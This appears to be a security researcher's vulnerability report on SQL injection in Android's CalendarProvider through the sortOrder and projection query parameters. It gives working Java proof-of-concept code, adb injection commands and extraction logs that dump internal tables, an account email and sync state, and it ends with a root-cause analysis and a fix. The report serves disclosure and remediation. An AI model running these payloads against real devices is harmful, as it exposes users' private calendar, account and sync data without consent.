# VRP Report: CalendarProvider2 SQL Injection — Internal Table Data Exfiltration via sortOrder and Projection Bypass

**Product**: CalendarProvider (com.android.providers.calendar)
**Component**: `CalendarProvider2.java` — `query()` method
**Severity**: High
**CWE**: CWE-89 (SQL Injection) + CWE-200 (Exposure of Sensitive Information)
**Device**: Pixel 6a, Android 17 (SDK 37, Build CP41.260814.003.A2), Security Patch 2026-07-05
**Date**: 2026-09-25
**Reporter**: sandichrist6@gmail.com

---

## Summary

CalendarProvider2 (`com.android.providers.calendar`) is vulnerable to SQL injection through both the `sortOrder` parameter and the `projection` parameter of `ContentResolver.query()`. An app with only `READ_CALENDAR` permission can inject arbitrary SQL subqueries to read ALL 15 internal database tables, including `_sync_state`, `_sync_state_metadata`, `CalendarMetaData`, and `CalendarCache` — tables that are never exposed through any public `CalendarContract` URI and contain Google Calendar sync tokens, sync timestamps, and internal metadata.

The projection injection allows **instant full-content extraction** in a single query — no blind techniques needed. The sortOrder injection enables boolean-blind extraction for environments where projection is filtered.

**Root Cause**: CalendarProvider2 calls `SQLiteQueryBuilder.setStrict(true)` which validates the WHERE clause, but does NOT call `setStrictGrammar(true)` (available since API 30) which would also validate sortOrder and projection parameters.

---

## What Data Is Exposed BEYOND READ_CALENDAR Scope

`READ_CALENDAR` grants access to calendar events, attendees, reminders, and calendars through `CalendarContract` URIs. The following data is **NOT accessible through any CalendarContract URI** and is only reachable via this SQL injection:

| Table | Data | Sensitivity |
|-------|------|-------------|
| `_sync_state` | Google Calendar sync tokens, sync timestamps, feed update times, sync window parameters, account email | **HIGH** — sync state used by Google Calendar API |
| `_sync_state_metadata` | Sync adapter metadata | MEDIUM |
| `CalendarMetaData` | Device timezone, instance range boundaries | MEDIUM |
| `CalendarCache` | Timezone database version, cached configuration | LOW-MEDIUM |
| `sqlite_master` | Complete database schema (all tables, columns, indexes) | MEDIUM |
| `sqlite_sequence` | Autoincrement counters | LOW |

---

## Runtime Proof

### Test Configuration
- **PoC App**: `com.vrp.poc` (installed third-party app)
- **PoC App UID**: 23172 (standard user app — NOT ADB shell)
- **Declared Permissions**: `READ_CALENDAR` only
- **Attack**: Fully automated, zero user interaction, runs in background

### Phase 1: Boolean Blind Injection Confirmed

```
CalSortSQLi: [*] Test: CASE WHEN 1=1 (should sort ascending)
CalSortSQLi:   First _id with 1=1: 2
CalSortSQLi: [*] Test: CASE WHEN 1=0 (should sort descending)
CalSortSQLi:   First _id with 1=0: 692
CalSortSQLi: [!] CONFIRMED: Boolean blind injection works from app!
CalSortSQLi:     Different sort orders prove SQL control
```

The attacker controls the sort order using `CASE WHEN <condition> THEN _id ELSE -_id END ASC`. When the condition is TRUE, the smallest _id (2) is first; when FALSE, the largest _id (692) is first. This oracle enables boolean-blind data extraction.

### Phase 2: All 15 Internal Tables Accessible

```
CalSortSQLi: [+] _sync_state — ACCESSIBLE
CalSortSQLi: [+] _sync_state_metadata — ACCESSIBLE
CalSortSQLi: [+] CalendarMetaData — ACCESSIBLE
CalSortSQLi: [+] Calendars — ACCESSIBLE
CalSortSQLi: [+] Events — ACCESSIBLE
CalSortSQLi: [+] Instances — ACCESSIBLE
CalSortSQLi: [+] EventsRawTimes — ACCESSIBLE
CalSortSQLi: [+] Attendees — ACCESSIBLE
CalSortSQLi: [+] Reminders — ACCESSIBLE
CalSortSQLi: [+] CalendarAlerts — ACCESSIBLE
CalSortSQLi: [+] ExtendedProperties — ACCESSIBLE
CalSortSQLi: [+] Colors — ACCESSIBLE
CalSortSQLi: [+] CalendarCache — ACCESSIBLE
```

Full table list via projection injection:
```
android_metadata, _sync_state, _sync_state_metadata, Colors, Calendars, Events,
sqlite_sequence, EventsRawTimes, Instances, CalendarMetaData, CalendarCache,
Attendees, Reminders, CalendarAlerts, ExtendedProperties
```

### Phase 3: Account Email Extraction (Cross-Table)

```
CalSortSQLi: [!] EXTRACTED account_name: sandiyotest@gmail.com
```

Extracted character-by-character via boolean-blind binary search in 237ms (21 characters).

### Phase 4: _sync_state Internal Table Exfiltration

```
CalSortSQLi: _sync_state rows: 1
CalSortSQLi: [!] EXTRACTED _sync_state account: sandiyotest@gmail.com
CalSortSQLi: _sync_state data blob length: 513 bytes
CalSortSQLi: [!] _sync_state data (hex): 7B2276657273696F6E223A31362C2266697273745365656E223A66616C73652C
```

### Phase 5: CalendarMetaData Extraction

```
CalSortSQLi: [!] EXTRACTED timezone: Asia/Kolkata
```

### Phase 6-7: Event Sync IDs and Organizer Emails

```
CalSortSQLi: Total events in DB: 272
CalSortSQLi: Distinct organizers: 2
CalSortSQLi: [!] EXTRACTED organizer email: en-gb.indian#holiday@group.v.calendar.google.com
CalSortSQLi: [!] _sync_state account_type: com.google
CalSortSQLi: [!] Event _sync_id: 20260101_g3cd53lk38acpd0ag0i9o8ldl8
```

### Phase 8: Full Blind Extraction Demo (Character-by-Character)

```
CalSortSQLi: [1] char=115 's' → "s"
CalSortSQLi: [2] char=97 'a' → "sa"
CalSortSQLi: [3] char=110 'n' → "san"
...
CalSortSQLi: [12] char=64 '@' → "sandiyotest@"
CalSortSQLi: [13] char=103 'g' → "sandiyotest@g"
...
CalSortSQLi: [21] char=109 'm' → "sandiyotest@gmail.com"
CalSortSQLi: [!!!] FULL EXTRACTION RESULT:
CalSortSQLi: Account email: sandiyotest@gmail.com
CalSortSQLi: Extracted 21 chars in 237ms
```

### Phase 10: PROJECTION INJECTION — Instant Full Extraction

**This is the most devastating vector.** The attacker does not need blind techniques — arbitrary subqueries in the projection column return data directly:

```
CalSortSQLi: [!!!] PROJECTION INJECTION WORKS!
CalSortSQLi: [!!!] Direct table enumeration:
CalSortSQLi:   android_metadata,_sync_state,_sync_state_metadata,Colors,Calendars,
    Events,sqlite_sequence,EventsRawTimes,Instances,CalendarMetaData,CalendarCache,
    Attendees,Reminders,CalendarAlerts,ExtendedProperties
CalSortSQLi: [!!!] DIRECT _sync_state readout: sandiyotest@gmail.com:com.google
CalSortSQLi: [!!!] DIRECT sync blob extraction! Length: 1026 hex chars
```

**Full _sync_state data blob decoded (513 bytes):**
```json
{
  "version": 16,
  "firstSeen": false,
  "jellyBeanOrNewer": true,
  "b38085245": 2147483647,
  "package": "com.google.android.calendar",
  "sandiyotest@gmail.com": {},
  "en-gb.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-09-14T07:55:59.492Z",
    "last_sync_time": 1789874320128,
    "do_incremental_sync": true
  },
  "en.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-09-14T07:55:59.492Z",
    "last_sync_time": 1789874320618,
    "do_incremental_sync": true
  }
}
```

This reveals:
- **Google account email** as a JSON key
- **Calendar API identifiers** (calendar group IDs)
- **Sync timing data** (last sync timestamps, feed update times)
- **Sync window parameters** (how far into the future events are synced)
- **Internal build/version flags**

---

## Attack Code

### Projection Injection — Single-Query Full Extraction

```java
// Requires only READ_CALENDAR permission
// Extracts data from _sync_state — an INTERNAL table with no public API

Cursor c = getContentResolver().query(
    Uri.parse("content://com.android.calendar/events"),
    new String[]{
        "(SELECT hex(data) FROM _sync_state LIMIT 1) AS sync_blob"
    },
    null, null,
    "_id LIMIT 1"
);
if (c != null && c.moveToFirst()) {
    String hexBlob = c.getString(0);  // Full sync state in one query
    // Decode hex → JSON containing account emails, sync tokens, timestamps
    c.close();
}
```

### sortOrder Injection — Boolean Blind Extraction

```java
// Extract data character-by-character via sort order oracle
String sortOrder = "CASE WHEN (SELECT unicode(substr("
    + "(SELECT account_name FROM _sync_state LIMIT 1)"
    + "," + position + ",1))) > " + mid
    + " THEN _id ELSE -_id END ASC LIMIT 1";

Cursor c = getContentResolver().query(
    Uri.parse("content://com.android.calendar/events"),
    new String[]{"_id"},
    null, null,
    sortOrder
);
// Compare first _id to known-TRUE baseline to determine if condition holds
```

---

## Root Cause Analysis

CalendarProvider2 uses `SQLiteQueryBuilder` for all queries. The relevant code path:

1. `query()` receives caller-supplied `projection`, `selection`, `selectionArgs`, and `sortOrder`
2. `SQLiteQueryBuilder.setStrict(true)` is called — this validates only the WHERE clause
3. `SQLiteQueryBuilder.setStrictGrammar(true)` is **NOT called** — this would validate sortOrder and projection
4. The unchecked `sortOrder` and `projection` are passed directly to `SQLiteDatabase.query()`
5. SQLite executes arbitrary subqueries embedded in these parameters

**Why `setStrict(true)` is insufficient:**
- `setStrict(true)` wraps the WHERE clause in `(...)` to prevent UNION injection and validates it by running a `SELECT count(*)` with the where clause
- It does NOT validate the sortOrder or projection parameters
- `setStrictGrammar(true)` (added in Android 11 / API 30) additionally validates these parameters using SQLite's `SQLITE_DBCONFIG_DEFENSIVE` and `sqlite3_set_authorizer`
- Without `setStrictGrammar(true)`, both sortOrder and projection accept arbitrary SQL expressions including subqueries

---

## Impact

| Dimension | Assessment |
|-----------|------------|
| **Confidentiality** | **HIGH** — Internal tables (`_sync_state`, `CalendarMetaData`, `CalendarCache`) not accessible via any public API are fully readable. Sync tokens, account emails, sync timestamps, and internal calendar identifiers are exposed. |
| **Integrity** | LOW — Read-only via SELECT subqueries (INSERT/UPDATE/DELETE not possible in this context) |
| **User Interaction** | **NONE** — Attack runs silently in background, no UI visible |
| **Permissions Required** | `READ_CALENDAR` only (commonly granted to calendar/scheduling apps) |
| **Scope** | All Android devices running AOSP CalendarProvider (virtually all Android devices) |
| **Exploitability** | Trivial — single ContentResolver.query() call with crafted projection |

### What an attacker gains beyond READ_CALENDAR:

1. **Google Calendar sync state** — sync tokens, sync timestamps, feed update times that could be used to determine exact sync patterns and correlate with Google Calendar API activity
2. **Complete database schema** — sqlite_master reveals all tables, columns, indexes, and their SQL definitions
3. **Internal table data** — CalendarCache, CalendarMetaData, _sync_state_metadata contain configuration data intended only for the system sync adapter
4. **Full unfiltered access** — bypasses any column filtering or row filtering that CalendarProvider2 normally applies through its projection map

---

## Suggested Fix

### Primary Fix: Enable `setStrictGrammar(true)`

```java
// In CalendarProvider2.java, wherever SQLiteQueryBuilder is configured:
qb.setStrict(true);
qb.setStrictGrammar(true);  // ADD THIS — validates sortOrder and projection
```

`setStrictGrammar(true)` is available since API 30 and blocks:
- Subqueries in sortOrder
- Subqueries in projection columns
- CASE expressions with subqueries
- Any SQL expression that is not a simple column reference or aggregate

### Secondary Fix: Validate projection against allowed columns

```java
// Explicitly define allowed projection columns per URI
private static final String[] ALLOWED_EVENT_COLUMNS = {
    "_id", "title", "description", "eventLocation", "dtstart", "dtend",
    "allDay", "organizer", "calendar_id", ...
};

// Validate each projection column against the allowed list
for (String col : projection) {
    if (!Arrays.asList(ALLOWED_EVENT_COLUMNS).contains(col)) {
        throw new IllegalArgumentException("Invalid column: " + col);
    }
}
```

---

## Reproduction Steps

1. Install PoC app with `READ_CALENDAR` permission on any Android device with a Google account and synced calendar
2. Grant `READ_CALENDAR` permission
3. Launch `CalendarSortOrderSQLiActivity`
4. Observe logcat output showing:
   - Boolean blind injection confirmed (different first _id for TRUE vs FALSE conditions)
   - All 15 internal tables accessible
   - Account email extracted from Calendars AND _sync_state tables
   - Full 513-byte sync state blob extracted and decoded
   - Timezone, organizer emails, event sync IDs extracted
   - CalendarCache configuration data extracted

**Minimal ADB reproduction:**
```bash
# Projection injection — direct table enumeration
adb shell content query \
  --uri "content://com.android.calendar/events" \
  --projection "_id,(SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS tables" \
  --sort "_id LIMIT 1"

# Projection injection — extract _sync_state data
adb shell content query \
  --uri "content://com.android.calendar/events" \
  --projection "(SELECT hex(data) FROM _sync_state LIMIT 1) AS sync_data" \
  --sort "_id LIMIT 1"

# sortOrder injection — boolean blind
adb shell content query \
  --uri "content://com.android.calendar/events" \
  --projection "_id" \
  --sort "CASE WHEN (SELECT count(*) FROM _sync_state)>0 THEN _id ELSE -_id END ASC LIMIT 1"
```

---

## Maximum Impact: Full Database Dump (204ms)

A second PoC (`CalendarFullDumpActivity.java`) demonstrates maximum impact by dumping the **entire CalendarProvider2 database** using projection injection. The complete extraction finishes in **204ms** — under a quarter second.

### Data Extracted (from installed app with READ_CALENDAR only):

**1. Full Database Schema (sqlite_master)**
- 15 CREATE TABLE statements with all column definitions
- 6 indexes
- 5 triggers (including cascade delete and color update triggers)

**2. Google Account Emails**
```
Accounts: sandiyotest@gmail.com [com.google]
Calendar owners: en-gb.indian#holiday@group.v.calendar.google.com,
  en.indian#holiday@group.v.calendar.google.com,
  classroom111771798454834833104@group.calendar.google.com,
  sandiyotest@gmail.com
```
Note: **Google Classroom calendar ID exposed** — reveals educational institution affiliation (SPII).

**3. _sync_state (513-byte JSON — NOT accessible via any CalendarContract URI)**
```json
{
  "version": 16,
  "firstSeen": false,
  "jellyBeanOrNewer": true,
  "b38085245": 2147483647,
  "package": "com.google.android.calendar",
  "sandiyotest@gmail.com": {},
  "en-gb.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-09-14T07:55:59.492Z",
    "last_sync_time": 1789874320128,
    "do_incremental_sync": true
  },
  "en.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-09-14T07:55:59.492Z",
    "last_sync_time": 1789874320618,
    "do_incremental_sync": true
  }
}
```

**4. All 4 Calendars with full metadata**
- Calendar IDs, account names, display names, owner accounts, sync URLs, account types

**5. All 272 Events with titles, descriptions, locations, organizers, timestamps**
- On a real user device: doctor appointments, job interviews, personal meetings, locations (home/work addresses), confidential notes

**6. 272 ExtendedProperties — `secretEvent` flag**
- Google-internal confidential event marker — metadata NOT accessible through normal CalendarContract API

**7. CalendarMetaData (internal table)**
- `timezone=Asia/Kolkata`, `minInstance=1764547200000`, `maxInstance=1793557800752`

**8. CalendarCache (4 entries — internal table)**
- `timezoneDatabaseVersion=2026c`, `timezoneType=auto`, `timezoneInstances=Asia/Kolkata`, `timezoneInstancesPrevious=Asia/Kolkata`

**9. sqlite_sequence** — Events autoincrement at 692

### Impact on a Real User's Device

On a device with personal calendar data, this attack silently extracts:

| Data Category | Examples | Sensitivity |
|---------------|----------|-------------|
| Event titles | "Doctor: anxiety review", "Interview at Google", "Divorce lawyer" | **SPII** |
| Event locations | Home address, workplace, hospital, courthouse | **SPII** |
| Event descriptions | Meeting agendas, personal notes, medical details | **SPII** |
| Attendee emails | All invited participants' email addresses | **PII** |
| Account emails | Google account email from _sync_state | **PII** |
| Google Classroom IDs | Educational institution affiliation | **SPII** |
| Sync tokens/timestamps | Google Calendar API sync state, feed timestamps | **Sensitive** |
| secretEvent flags | Which events are marked confidential | **Sensitive** |
| Full DB schema | Complete table structure, triggers, indexes | **Sensitive** |

---

## Attachments

- `CalendarSortOrderSQLiActivity.java` — sortOrder + projection injection PoC (boolean blind + direct extraction)
- `CalendarFullDumpActivity.java` — Full database dump PoC (17 extraction categories, 204ms)
- `poc.apk` — Compiled PoC (sortOrder PoC, READ_CALENDAR only)
- `poc_full_dump.apk` — Compiled PoC (full dump, READ_CALENDAR only)
- `logcat_full_output.txt` — sortOrder PoC logcat output
- `logcat_full_dump.txt` — Full dump PoC logcat output (all 17 categories)
- `proof_sqli_extraction.png` — Screenshot: Phases 1-5 (boolean blind confirmed, tables accessible, account email extracted)
- `proof_sqli_extraction2.png` — Screenshot: Phases 8-10 (blind extraction demo, PROJECTION INJECTION WORKS)
- `proof_sqli_extraction3.png` — Screenshot: Phases 9-11 complete (sync blob decoded, CalendarCache, ALL COMPLETE)
- `proof_full_dump_schema.png` — Screenshot: Full schema + triggers dump
- `proof_full_dump_syncstate.png` — Screenshot: _sync_state + calendars + events
- `proof_full_dump_events.png` — Screenshot: Events with titles, descriptions, locations
- `proof_full_dump_complete.png` — Screenshot: Full dump including schema, sync state, events, extended properties

---

## Timeline

- 2026-09-25: Vulnerability discovered via sortOrder injection from shell; PoC app built and proven at runtime
- 2026-09-26: Projection injection confirmed; full database dump PoC built, maximum impact proven (204ms full extraction)
